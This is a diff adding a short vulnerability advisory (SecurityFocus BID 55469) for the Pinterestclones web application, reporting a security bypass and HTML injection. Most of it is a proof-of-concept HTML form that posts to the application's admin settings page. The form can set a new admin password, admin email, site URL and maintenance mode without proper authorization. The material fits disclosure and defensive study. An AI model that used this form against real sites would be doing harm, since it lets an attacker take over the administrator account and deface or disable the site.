@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/55469/info
+
+Pinterestclones is prone to a security-bypass vulnerability and an HTML-injection vulnerability because it fails to properly validate user permissions and sanitize user-supplied input.
+
+An attacker may leverage the HTML-injection issue to inject hostile HTML and script code that would run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. The attacker may leverage the security-bypass issue to bypass certain security restrictions and perform unauthorized actions in the affected application. 
+
+<form action="http://www.example.com/admin/settings.php" method="post" class="niceform" name="frmname" enctype="multipart/form-data">
+Name:<input type="text" class="txtFname" name="name" id="name" size="50" value="Admin"/>
+User Name:<input type="text" class="txtFname" name="uname" readonly="readonly" id="uname" size="50" value="admin@pinterestclones.com"/>
+New Password:<input type="password" class="txtFname" name="password" id="password" size="50" value=""/>
+Confirm Password:<input type="password" class="txtFname" name="cpassword" id="cpassword" size="50" value=""/>
+Site Slogan:<input type="text" name="txtSlogan" id="txtSlogan" size="50" value="Your online pinboard"/>
+Site URL:<input type="text" name="txtUrl" id="txtUrl" size="50" value=""/>
+Admin Email:<input type="text" name="aemail" id="aemail" size="50" value=""/>
+.Under maintenance:<select name="maintenance">
+<option value="No" selected>No</option>
+<option value="Yes">Yes</option>
+</select>
+Maintenance message:
+<input type="text" name="maintenancemsg" id="maintenancemsg" size="50" value="We are upgrading the site."/>
+<dl class="submit">
+<input type="submit" value="Save" class="submit" name="sbmtbtn" style="width:50px;"/>
+</form>
+
